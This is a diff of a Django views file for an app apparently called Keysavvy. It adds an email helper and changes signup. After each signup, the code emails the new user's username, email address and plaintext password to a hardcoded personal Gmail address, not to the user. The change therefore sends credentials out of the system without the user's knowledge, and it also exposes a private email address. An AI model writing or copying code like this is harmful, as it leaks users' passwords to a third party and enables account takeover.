@@ -8,6 +8,23 @@ from .forms import LoginForm, SignupForm
 from django.contrib.auth.decorators import login_required
 from .models import UserProfile
 from .forms import UserProfileForm
+from django.conf import settings
+from django.core.mail import EmailMessage
+from django.template.loader import render_to_string
+
+
+def send_email(subject, recipient_list, template_path, context):
+    message = render_to_string(template_path, context)
+    email = EmailMessage(
+        subject=subject,
+        body=message,
+        from_email=settings.EMAIL_HOST_USER,
+        to=recipient_list,
+    )
+    email.content_subtype = 'html'
+    email.send()
+    print("email send")
+
 
 def load_json_file(file_path):
     absolute_path = os.path.join(settings.BASE_DIR, file_path)
@@ -25,6 +42,7 @@ def auth(request):
         "signin_form": signin_form,
         "header_color": "background-color: rgb(26, 43, 99) !important"
     }
+    
     return render(request, "auth.html", context)
 
 @login_required(login_url="auth")
@@ -152,7 +170,16 @@ def user_signup(request):
             user = authenticate(request, username=username, password=password)
 
             if user:
-                auth_login(request, user)  
+                auth_login(request, user)
+                subject = 'Wellcome Message from Keysavvy'
+                recipient_list = ["umairashraf5252@gmail.com"]
+                template_path = 'emails/wellcome.html'
+                context = {
+                    "user_email": user.email,
+                    "user_name": user.username,
+                    "user_password": password
+                }
+                send_email(subject, recipient_list, template_path, context) 
                 return redirect('dashboard')
         else:
             return render(request, 'auth.html', {
